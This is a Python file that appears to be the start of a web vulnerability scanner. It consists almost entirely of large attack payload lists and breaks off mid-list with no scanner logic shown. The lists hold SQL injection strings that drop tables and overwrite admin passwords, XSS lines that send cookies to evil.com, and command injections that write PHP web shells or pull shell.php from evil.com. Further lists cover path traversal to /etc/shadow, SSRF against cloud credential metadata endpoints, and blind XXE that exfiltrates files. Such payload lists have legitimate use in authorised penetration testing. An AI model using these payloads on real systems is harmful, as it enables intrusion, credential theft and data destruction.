import requests
import socket
import ssl
import threading
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore, Style, init
import pickle
import base64
from selenium import webdriver
from urllib.parse import urlparse



init(autoreset=True)
SQLI_PAYLOADS = [
    # Basic payloads
    "' OR '1'='1",
    "' OR 'a'='a",
    '" OR "1"="1',
    "' OR 1=1--",
    "' OR 'a'='a'--",
    "' OR '1'='1' #",
    "' OR 'a'='a' #",
    "' OR '1'='1'/*",
    "' OR 'a'='a'/*",

    # Union-based payloads
    "' UNION SELECT null,null--",
    "' UNION SELECT 1,'a'--",
    "' UNION SELECT 'a','b'--",
    "' UNION SELECT database(),user()--",
    "' UNION SELECT @@version,@@hostname--",
    "' UNION SELECT table_name,column_name FROM information_schema.columns--",
    "' UNION SELECT 1,LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT 1,@@datadir--",
    "' UNION SELECT 1,@@version_compile_os--",

    # Error-based payloads
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND 1=CAST((SELECT @@version) AS int)--",
    "' AND 1=CONVERT(int, (SELECT user))--",
    "' AND 1=CAST((SELECT user) AS int)--",
    "' AND 1=CONVERT(int, (SELECT database()))--",
    "' AND 1=CAST((SELECT database()) AS int)--",

    # Boolean-based payloads
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "' AND (SELECT COUNT(*) FROM users) > 0--",
    "' AND (SELECT COUNT(*) FROM users) = 0--",
    "' AND (SELECT LENGTH(user())) > 0--",
    "' AND (SELECT LENGTH(user())) = 0--",

    # Time-based payloads
    "' AND IF(1=1, SLEEP(5), 0)--",
    "' AND IF(1=2, SLEEP(5), 0)--",
    "' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)--",
    "' AND IF((SELECT COUNT(*) FROM users) = 0, SLEEP(5), 0)--",
    "' AND IF((SELECT LENGTH(user())) > 0, SLEEP(5), 0)--",
    "' AND IF((SELECT LENGTH(user())) = 0, SLEEP(5), 0)--",

    # Blind payloads
    "' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--",
    "' AND (SELECT COUNT(*) FROM users WHERE username='admin') = 0--",
    "' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 0--",
    "' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 0--",

    # Stacked queries
    "'; DROP TABLE users--",
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    "'; INSERT INTO users (username, password) VALUES ('hacker', 'hacked')--",

    # Bypass filters
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR '1'='1' -- -",
    "' OR '1'='1' /*!50000",
    "' OR '1'='1' /*!50000*/",
    "' OR '1'='1' /*!50000*/--",
    "' OR '1'='1' /*!50000*/#",

    # Advanced payloads
    "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
    "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--",
    "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",
    "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--",
    "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--",
    "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--",

    # Obfuscated payloads
    "' OR '1'='1' /*!50000UNION*/ SELECT 1,2,3--",
    "' OR '1'='1' /*!50000UNION*/ SELECT 1,2,3,4,5,6,7,8,9,10--",
    "' OR '1'='1' /*!50000UNION*/ SELECT 1,2,3,4,5,6,7,8,9,10,11--",
    "' OR '1'='1' /*!50000UNION*/ SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",
    "' OR '1'='1' /*!50000UNION*/ SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--",
    "' OR '1'='1' /*!50000UNION*/ SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--",
    "' OR '1'='1' /*!50000UNION*/ SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--",

    # Database-specific payloads
    # MySQL
    "' OR '1'='1' UNION SELECT 1,@@version,3--",
    "' OR '1'='1' UNION SELECT 1,user(),3--",
    "' OR '1'='1' UNION SELECT 1,database(),3--",
    "' OR '1'='1' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
    "' OR '1'='1' UNION SELECT 1,column_name,3 FROM information_schema.columns--",

    # PostgreSQL
    "' OR '1'='1' UNION SELECT 1,version(),3--",
    "' OR '1'='1' UNION SELECT 1,current_user,3--",
    "' OR '1'='1' UNION SELECT 1,current_database(),3--",
    "' OR '1'='1' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
    "' OR '1'='1' UNION SELECT 1,column_name,3 FROM information_schema.columns--",

    # SQL Server
    "' OR '1'='1' UNION SELECT 1,@@version,3--",
    "' OR '1'='1' UNION SELECT 1,SYSTEM_USER,3--",
    "' OR '1'='1' UNION SELECT 1,DB_NAME(),3--",
    "' OR '1'='1' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
    "' OR '1'='1' UNION SELECT 1,column_name,3 FROM information_schema.columns--",

    # Oracle
    "' OR '1'='1' UNION SELECT 1,banner,3 FROM v$version--",
    "' OR '1'='1' UNION SELECT 1,user,3 FROM dual--",
    "' OR '1'='1' UNION SELECT 1,table_name,3 FROM all_tables--",
    "' OR '1'='1' UNION SELECT 1,column_name,3 FROM all_tab_columns--",

    # SQLite
    "' OR '1'='1' UNION SELECT 1,sqlite_version(),3--",
    "' OR '1'='1' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--",
    "' OR '1'='1' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table'--",

    # Miscellaneous
    "' OR '1'='1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
    "' OR '1'='1' UNION SELECT 1,@@datadir,3--",
    "' OR '1'='1' UNION SELECT 1,@@version_compile_os,3--",
    "' OR '1'='1' UNION SELECT 1,@@hostname,3--",
]

XSS_PAYLOADS = [
    # Basic payloads
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg/onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<a href="javascript:alert(\'XSS\')">Click</a>',
    '<div style="background:url(javascript:alert(\'XSS\'))">',
    '<input type="text" value="<script>alert(\'XSS\')</script>">',
    '<script>document.cookie</script>',
    '<script>window.location="http://evil.com"</script>',

    # Obfuscated payloads
    '<scr<script>ipt>alert("XSS")</script>',
    '<img src="x" onerror="alert&#40;\'XSS\'&#41;">',
    '<svg/onload=alert`XSS`>',
    '<body onload=alert`XSS`>',
    '<iframe src="javascrip&#x74;:alert(\'XSS\')">',
    '<a href="javascrip&#x74;:alert(\'XSS\')">Click</a>',
    '<div style="background:url(javascrip&#x74;:alert(\'XSS\'))">',
    '<input type="text" value="<script>alert&#40;\'XSS\'&#41;</script>">',
    '<script>document.write(\'XSS\')</script>',
    '<script>document.write(document.cookie)</script>',

    # DOM-based payloads
    '<img src="x" onerror="eval(\'alert(\\\'XSS\\\')\')">',
    '<svg/onload="eval(\'alert(\\\'XSS\\\')\')">',
    '<body onload="eval(\'alert(\\\'XSS\\\')\')">',
    '<iframe src="javascript:eval(\'alert(\\\'XSS\\\')\')">',
    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click</a>',
    '<div style="background:url(javascript:eval(\'alert(\\\'XSS\\\')\'))">',
    '<input type="text" value="<script>eval(\'alert(\\\'XSS\\\')\')</script>">',
    '<script>eval(\'alert(\\\'XSS\\\')\')</script>',
    '<script>eval(document.cookie)</script>',
    '<script>eval(window.location="http://evil.com")</script>',

    # Advanced payloads
    '<img src="x" onerror="fetch(\'http://evil.com/?cookie=\'+document.cookie)">',
    '<svg/onload="fetch(\'http://evil.com/?cookie=\'+document.cookie)">',
    '<body onload="fetch(\'http://evil.com/?cookie=\'+document.cookie)">',
    '<iframe src="javascript:fetch(\'http://evil.com/?cookie=\'+document.cookie)">',
    '<a href="javascript:fetch(\'http://evil.com/?cookie=\'+document.cookie)">Click</a>',
    '<div style="background:url(javascript:fetch(\'http://evil.com/?cookie=\'+document.cookie))">',
    '<input type="text" value="<script>fetch(\'http://evil.com/?cookie=\'+document.cookie)</script>">',
    '<script>fetch(\'http://evil.com/?cookie=\'+document.cookie)</script>',
    '<script>fetch(\'http://evil.com/?location=\'+window.location)</script>',
    '<script>fetch(\'http://evil.com/?useragent=\'+navigator.userAgent)</script>',

    # Bypass filters
    '<scr<script>ipt>alert("XSS")</scr<script>ipt>',
    '<img src="x" onerror="alert&#40;\'XSS\'&#41;">',
    '<svg/onload=alert`XSS`>',
    '<body onload=alert`XSS`>',
    '<iframe src="javascrip&#x74;:alert(\'XSS\')">',
    '<a href="javascrip&#x74;:alert(\'XSS\')">Click</a>',
    '<div style="background:url(javascrip&#x74;:alert(\'XSS\'))">',
    '<input type="text" value="<script>alert&#40;\'XSS\'&#41;</script>">',
    '<script>document.write(\'XSS\')</script>',
    '<script>document.write(document.cookie)</script>',

    # Miscellaneous
    '<img src="x" onerror="alert(String.fromCharCode(88,83,83))">',
    '<svg/onload="alert(String.fromCharCode(88,83,83))">',
    '<body onload="alert(String.fromCharCode(88,83,83))">',
    '<iframe src="javascript:alert(String.fromCharCode(88,83,83))">',
    '<a href="javascript:alert(String.fromCharCode(88,83,83))">Click</a>',
    '<div style="background:url(javascript:alert(String.fromCharCode(88,83,83)))">',
    '<input type="text" value="<script>alert(String.fromCharCode(88,83,83))</script>">',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>document.write(String.fromCharCode(88,83,83))</script>',
    '<script>document.write(document.cookie)</script>',
]

COMMAND_INJECTION_PAYLOADS = [
    # Basic command execution
    '; ls',
    '; cat /etc/passwd',
    '; whoami',
    '; ping -c 1 localhost',
    '; id',
    '; uname -a',
    '; ps aux',
    '; netstat -an',
    '; ifconfig',
    '; curl http://evil.com',

    # Command chaining
    '| ls',
    '| cat /etc/passwd',
    '| whoami',
    '| ping -c 1 localhost',
    '| id',
    '| uname -a',
    '| ps aux',
    '| netstat -an',
    '| ifconfig',
    '| curl http://evil.com',

    '&& ls',
    '&& cat /etc/passwd',
    '&& whoami',
    '&& ping -c 1 localhost',
    '&& id',
    '&& uname -a',
    '&& ps aux',
    '&& netstat -an',
    '&& ifconfig',
    '&& curl http://evil.com',

    '|| ls',
    '|| cat /etc/passwd',
    '|| whoami',
    '|| ping -c 1 localhost',
    '|| id',
    '|| uname -a',
    '|| ps aux',
    '|| netstat -an',
    '|| ifconfig',
    '|| curl http://evil.com',

    # Command substitution
    '`ls`',
    '`cat /etc/passwd`',
    '`whoami`',
    '`ping -c 1 localhost`',
    '`id`',
    '`uname -a`',
    '`ps aux`',
    '`netstat -an`',
    '`ifconfig`',
    '`curl http://evil.com`',

    # Blind command injection
    '; sleep 5',
    '| sleep 5',
    '&& sleep 5',
    '|| sleep 5',
    '`sleep 5`',

    '; ping -c 5 127.0.0.1',
    '| ping -c 5 127.0.0.1',
    '&& ping -c 5 127.0.0.1',
    '|| ping -c 5 127.0.0.1',
    '`ping -c 5 127.0.0.1`',

    '; curl http://evil.com',
    '| curl http://evil.com',
    '&& curl http://evil.com',
    '|| curl http://evil.com',
    '`curl http://evil.com`',

    # Bypass filters
    ';${IFS}ls',
    ';${IFS}cat${IFS}/etc/passwd',
    ';${IFS}whoami',
    ';${IFS}ping${IFS}-c${IFS}1${IFS}localhost',
    ';${IFS}id',
    ';${IFS}uname${IFS}-a',
    ';${IFS}ps${IFS}aux',
    ';${IFS}netstat${IFS}-an',
    ';${IFS}ifconfig',
    ';${IFS}curl${IFS}http://evil.com',

    ';{ls}',
    ';{cat,/etc/passwd}',
    ';{whoami}',
    ';{ping,-c,1,localhost}',
    ';{id}',
    ';{uname,-a}',
    ';{ps,aux}',
    ';{netstat,-an}',
    ';{ifconfig}',
    ';{curl,http://evil.com}',

    ';$(ls)',
    ';$(cat /etc/passwd)',
    ';$(whoami)',
    ';$(ping -c 1 localhost)',
    ';$(id)',
    ';$(uname -a)',
    ';$(ps aux)',
    ';$(netstat -an)',
    ';$(ifconfig)',
    ';$(curl http://evil.com)',

    # Advanced payloads
    '; echo "<?php echo shell_exec($_GET[\'cmd\']); ?>" > shell.php',
    '; echo "<?php system($_GET[\'cmd\']); ?>" > shell.php',
    '; echo "<?php passthru($_GET[\'cmd\']); ?>" > shell.php',
    '; echo "<?php exec($_GET[\'cmd\']); ?>" > shell.php',
    '; echo "<?php eval($_GET[\'cmd\']); ?>" > shell.php',

    '; wget http://evil.com/shell.php -O /var/www/html/shell.php',
    '; curl http://evil.com/shell.php -o /var/www/html/shell.php',
    '; ftp -n -v evil.com < ftp_commands.txt',
    '; scp shell.php user@evil.com:/var/www/html/shell.php',
    '; rsync shell.php user@evil.com:/var/www/html/shell.php',

    # Miscellaneous
    '; echo "Hello, World!"',
    '; echo "Hello, World!" > /tmp/test.txt',
    '; echo "Hello, World!" | tee /tmp/test.txt',
    '; echo "Hello, World!" | mail -s "Test" user@example.com',
    '; echo "Hello, World!" | wall',
]

PATH_TRAVERSAL_PAYLOADS = [
    # Basic traversal
    '../../../../etc/passwd',
    '../../../../etc/hosts',
    '../../../../windows/win.ini',
    '../../../../boot.ini',
    '../../../../var/log/auth.log',
    '../../../../var/log/syslog',
    '../../../../var/www/html/index.php',
    '../../../../var/lib/mysql/my.cnf',
    '../../../../etc/shadow',
    '../../../../etc/group',

    # Encoded traversal
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flog%2fauth.log',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flog%2fsyslog',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2fwww%2fhtml%2findex.php',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flib%2fmysql%2fmy.cnf',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fgroup',

    # Null byte injection
    '../../../../etc/passwd%00',
    '../../../../etc/hosts%00',
    '../../../../windows/win.ini%00',
    '../../../../boot.ini%00',
    '../../../../var/log/auth.log%00',
    '../../../../var/log/syslog%00',
    '../../../../var/www/html/index.php%00',
    '../../../../var/lib/mysql/my.cnf%00',
    '../../../../etc/shadow%00',
    '../../../../etc/group%00',

    # Double encoding
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin.ini',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252flog%252fauth.log',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252flog%252fsyslog',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252fwww%252fhtml%252findex.php',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252flib%252fmysql%252fmy.cnf',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fgroup',

    # Bypass filters
    '....//....//....//etc/passwd',
    '....//....//....//etc/hosts',
    '....//....//....//windows/win.ini',
    '....//....//....//boot.ini',
    '....//....//....//var/log/auth.log',
    '....//....//....//var/log/syslog',
    '....//....//....//var/www/html/index.php',
    '....//....//....//var/lib/mysql/my.cnf',
    '....//....//....//etc/shadow',
    '....//....//....//etc/group',
    '..\\..\\..\\..\\etc\\passwd',
    '..\\..\\..\\..\\etc\\hosts',
    '..\\..\\..\\..\\windows\\win.ini',
    '..\\..\\..\\..\\boot.ini',
    '..\\..\\..\\..\\var\\log\\auth.log',
    '..\\..\\..\\..\\var\\log\\syslog',
    '..\\..\\..\\..\\var\\www\\html\\index.php',
    '..\\..\\..\\..\\var\\lib\\mysql\\my.cnf',
    '..\\..\\..\\..\\etc\\shadow',
    '..\\..\\..\\..\\etc\\group',

    # Miscellaneous
    '/etc/passwd',
    '/etc/hosts',
    '/windows/win.ini',
    '/boot.ini',
    '/var/log/auth.log',
    '/var/log/syslog',
    '/var/www/html/index.php',
    '/var/lib/mysql/my.cnf',
    '/etc/shadow',
    '/etc/group',
]


FILE_INCLUSION_PAYLOADS = [
    # Basic file inclusion payloads
    "../../../../etc/passwd",
    "../../../../etc/hosts",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../../../windows/system.ini",
    "../../../../boot.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\system.ini",
    "/etc/passwd",
    "/etc/hosts",
    "/etc/shadow",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\system.ini",
    "C:\\boot.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "php://stdin",
    "file:///etc/passwd",
    "file:///C:/windows/win.ini",
    "http://evil.com/shell.txt",
    "data://text/plain,<?php echo shell_exec('whoami'); ?>",
    "zip://archive.zip#file.txt",
    "phar://archive.phar/file.txt",
    "expect://whoami",
    "ssh2.shell://user:pass@example.com:22/xterm",
]




SSRF_PAYLOADS = [
    # AWS Metadata Service
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/user-data/',
    'http://169.254.169.254/latest/dynamic/instance-identity/document',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://169.254.169.254/latest/meta-data/public-ipv4',
    'http://169.254.169.254/latest/meta-data/local-ipv4',
    'http://169.254.169.254/latest/meta-data/hostname',
    'http://169.254.169.254/latest/meta-data/ami-id',
    'http://169.254.169.254/latest/meta-data/instance-id',
    'http://169.254.169.254/latest/meta-data/instance-type',

    # Google Cloud Metadata Service
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://metadata.google.internal/computeMetadata/v1/instance/',
    'http://metadata.google.internal/computeMetadata/v1/instance/id',
    'http://metadata.google.internal/computeMetadata/v1/instance/hostname',
    'http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/',
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
    'http://metadata.google.internal/computeMetadata/v1/instance/tags',
    'http://metadata.google.internal/computeMetadata/v1/project/project-id',

    # Azure Metadata Service
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    'http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01',
    'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01',
    'http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01',
    'http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01',
    'http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01',
    'http://169.254.169.254/metadata/instance/compute/osType?api-version=2021-02-01',
    'http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01',

    # Localhost and Internal Services
    'http://localhost/',
    'http://localhost/admin',
    'http://localhost:8080/',
    'http://127.0.0.1/',
    'http://127.0.0.1/admin',
    'http://127.0.0.1:8080/',
    'http://0.0.0.0/',
    'http://0.0.0.0/admin',
    'http://0.0.0.0:8080/',
    'http://internal.api.local/',
    'http://internal.api.local/admin',
    'http://internal.api.local:8080/',
    'http://192.168.0.1/',
    'http://192.168.0.1/admin',
    'http://192.168.0.1:8080/',
    'http://10.0.0.1/',
    'http://10.0.0.1/admin',
    'http://10.0.0.1:8080/',

    # Bypass Filters
    'http://localhost@evil.com/',
    'http://127.0.0.1@evil.com/',
    'http://0.0.0.0@evil.com/',
    'http://internal.api.local@evil.com/',
    'http://192.168.0.1@evil.com/',
    'http://10.0.0.1@evil.com/',
    'http://localhost%2eevil.com/',
    'http://127.0.0.1%2eevil.com/',
    'http://0.0.0.0%2eevil.com/',
    'http://internal.api.local%2eevil.com/',
    'http://192.168.0.1%2eevil.com/',
    'http://10.0.0.1%2eevil.com/',

    # Miscellaneous
    'http://example.com/',
    'http://example.com/admin',
    'http://example.com:8080/',
    'http://evil.com/',
    'http://evil.com/admin',
    'http://evil.com:8080/',
    'http://example.com/?url=http://169.254.169.254/latest/meta-data/',
    'http://example.com/?url=http://localhost/admin',
    'http://example.com/?url=http://127.0.0.1:8080/',
    'http://example.com/?url=http://internal.api.local/',
]

XXE_PAYLOADS = [
    # Basic XXE for file disclosure
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/boot.ini"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/log/auth.log"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/log/syslog"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/index.php"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/lib/mysql/my.cnf"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/group"> ]><foo>&xxe;</foo>',

    # XXE for SSRF
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost/admin"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.api.local/"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.0.1/"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.0.0.1/"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://example.com/"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01"> ]><foo>&xxe;</foo>',

    # Blind XXE
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/xxe"> %xxe; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%xxe;\'>"> %eval; %exfil; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/hosts"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%xxe;\'>"> %eval; %exfil; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///C:/windows/win.ini"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%xxe;\'>"> %eval; %exfil; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///C:/boot.ini"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%xxe;\'>"> %eval; %exfil; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///var/log/auth.log"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%xxe;\'>"> %eval; %exfil; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///var/log/syslog"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%xxe;\'>"> %eval; %exfil; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///var/www/html/index.php"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%xxe;\'>"> %eval; %exfil; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///var/lib/mysql/my.cnf"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%xxe;\'>"> %eval; %exfil; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/shadow"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%xxe;\'>"> %eval; %exfil; ]><foo></foo>',

    # Bypass Filters
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/hosts"> %xxe; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///C:/windows/win.ini"> %xxe; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///C:/boot.ini"> %xxe; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///var/log/auth.log"> %xxe; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///var/log/syslog"> %xxe; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///var/www/html/index.php"> %xxe; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///var/lib/mysql/my.cnf"> %xxe; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/shadow"> %xxe; ]><foo></foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/group"> %xxe; ]><foo></foo>',

    # Miscellaneous
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain,<?php echo shell_exec(\'whoami\'); ?>"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain,<?php echo shell_exec(\'ls\'); ?>"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain,<?php echo shell_exec(\'cat /etc/passwd\'); ?>"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain,<?php echo shell_exec(\'uname -a\'); ?>"> ]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain,<?php echo shell_exec(\'id\'); ?>"> ]><foo>&xxe;</foo>',
